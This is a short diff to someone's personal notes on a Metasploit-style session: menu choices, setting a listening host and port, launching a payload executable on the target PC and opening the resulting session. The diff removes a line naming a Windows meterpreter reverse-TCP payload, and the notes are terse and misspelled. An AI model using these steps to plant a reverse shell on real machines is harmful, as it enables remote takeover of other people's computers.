@@ -1,6 +1,6 @@
 lhost:= listning host
 
 option := 1 => 4 => 2 => set lhost <my ip>=> set lport <any port> 
-set payload windows/meterpreter/reverse_tcp
+##start payload.exe in rhost pc
+sessions -i 1
 expolite
-session -1 1
